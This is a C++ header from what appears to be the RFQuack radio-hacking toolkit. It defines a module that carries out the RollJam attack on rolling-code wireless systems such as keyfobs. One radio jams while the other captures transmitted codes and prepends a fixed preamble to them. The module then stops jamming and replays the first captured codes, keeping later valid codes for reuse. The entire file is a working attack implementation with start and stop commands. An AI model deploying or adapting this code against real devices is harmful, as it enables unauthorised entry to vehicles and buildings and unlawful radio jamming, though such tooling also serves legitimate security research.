#ifndef RFQUACK_PROJECT_ROLLJAMMODULE_H
#define RFQUACK_PROJECT_ROLLJAMMODULE_H

#include "../RFQModule.h"
#include "../../rfquack_common.h"
#include "../../radio/RadioLibWrapper.h"
#include "../../rfquack.pb.h"
#include "../../rfquack_config.h"

class RollJamModule : public RFQModule {
public:
    RollJamModule() : RFQModule(RFQUACK_TOPIC_ROLL_JAM) {}

    virtual void onInit() {
    }

    virtual bool onPacketReceived(rfquack_Packet &pkt, rfquack_WhichRadio whichRadio) {
      if (buffer != NULL && bufferSize < bufferMaxSize) {

        // Store received packet.
        RFQUACK_LOG_TRACE(F("RollJam: Storing packet..."))

        // Create a new packet
        rfquack_Packet packetToStore = rfquack_Packet_init_zero;
        packetToStore.has_repeat = true;
        packetToStore.repeat = 1;

        // Prepend missing part to received packet.
        byte missingPart[6] = {0xff, 0x55, 0x55, 0x55, 0x56, 0x5a};
        memcpy(packetToStore.data.bytes, missingPart, 6);
        memcpy(packetToStore.data.bytes + 6, pkt.data.bytes, pkt.data.size);
        packetToStore.data.size = 6 + pkt.data.size;

        // Store received packet
        memcpy(&(buffer[bufferSize]), &packetToStore, sizeof(rfquack_Packet));
        bufferSize++;
        RFQUACK_LOG_TRACE(F("RollJam: stored %d packets"), bufferSize)

        // If we filled the buffer, stop jamming, put RadioA in tx mode and re-send the first N packets.
        if (bufferSize == bufferMaxSize) {

          // Stop jamming
          RFQUACK_LOG_TRACE(F("RollJam: stop jamming."))
          rfqRadio->setMode(rfquack_Mode_RX, listenRadio);

          // Put radioA in TX mode.
          RFQUACK_LOG_TRACE(F("RollJam: listenRadio in TX mode."))
          rfqRadio->setMode(rfquack_Mode_TX, listenRadio);

          delay(2000);
          // Fire packet
          RFQUACK_LOG_TRACE(F("RollJam: Will repeat first %d packets"), pktToReplay)
          for (int i = 0; i < pktToReplay; i++) {
            RFQUACK_LOG_TRACE(F("RollJam: Sending %d/%d packets"), (i + 1), pktToReplay)
            rfquack_Packet *packet = &(buffer[i]);
            packet->has_repeat = true;
            packet->repeat = 1;
            rfqRadio->transmit(packet, rfquack_WhichRadio_RADIOA);
          }
        }
      }
      return true;
    }

    bool afterPacketReceived(rfquack_Packet &pkt, rfquack_WhichRadio whichRadio) override {
      return true;
    }

    virtual void
    executeUserCommand(char *verb, char **args, uint8_t argsLen, char *messagePayload, unsigned int messageLen) {
      // Start Roll Jam attack:
      CMD_MATCHES_METHOD_CALL(rfquack_VoidValue, "start", "Start Roll Jam", start(reply))

      // Stop Roll Jam attack:
      CMD_MATCHES_METHOD_CALL(rfquack_VoidValue, "stop", "Stop Roll Jam", stop())

      // Set how many packet to capture.
      CMD_MATCHES_UINT("pkt_to_capture",
                       "How many packet to capture before replaying (default: 2).",
                       pktToCapture)

      // Set how many packet to replay.
      CMD_MATCHES_UINT("pkt_to_repeat",
                       "How many packets to replay (default: 1)",
                       pktToReplay)

      // Set radio to use for listening.
      CMD_MATCHES_WHICHRADIO("listen_radio",
                             "Which radio to use to listen for packets (default: 0 : RadioA)",
                             listenRadio)

      // Set radio to use for jamming.
      CMD_MATCHES_WHICHRADIO("jam_radio",
                             "Which radio to use to listen for jamming (default: 1:  RadioB)",
                             jamRadio)
    }

    void start(rfquack_CmdReply &reply) {
      // Free memory buffer if already allocated.
      if (buffer != NULL) {
        delete buffer;
      }

      if (pktToCapture <= 0 || pktToReplay <= 0 || pktToReplay > pktToCapture) {
        reply.has_message = true;
        char *message = "Please set pkt_to_capture and pkt_to_repeat";
        strcpy(reply.message, message);
        Log.error(message);
        return;
      }



      // Allocate memory to store N packets
      bufferSize = 0;
      bufferMaxSize = pktToCapture;
      buffer = new rfquack_Packet[bufferMaxSize];

      // Put jamRadio in Jamming Mode.
      reply.result = rfqRadio->setMode(rfquack_Mode_JAM, jamRadio);
      if (reply.result != ERR_NONE) {
        return;
      }

      // Put RadioA in RX mode.
      reply.result = rfqRadio->setMode(rfquack_Mode_RX, listenRadio);
      if (reply.result != ERR_NONE) {
        return;
      }

      // Enable module
      this->enabled = true;
    }

    void stop() {
      // Disable module
      this->enabled = false;

      // Put both radios in RX
      rfqRadio->setMode(rfquack_Mode_IDLE, listenRadio);
      rfqRadio->setMode(rfquack_Mode_IDLE, jamRadio);
    }

private:
    // Buffer to store 'jammed' packets
    rfquack_Packet *buffer = NULL;
    uint8_t bufferSize;
    uint8_t bufferMaxSize;

    // Config variables
    uint8_t pktToCapture = 2;
    uint8_t pktToReplay = 1;
    rfquack_WhichRadio listenRadio = rfquack_WhichRadio_RADIOA;
    rfquack_WhichRadio jamRadio = rfquack_WhichRadio_RADIOB;
};

#endif //RFQUACK_PROJECT_ROLLJAMMODULE_H
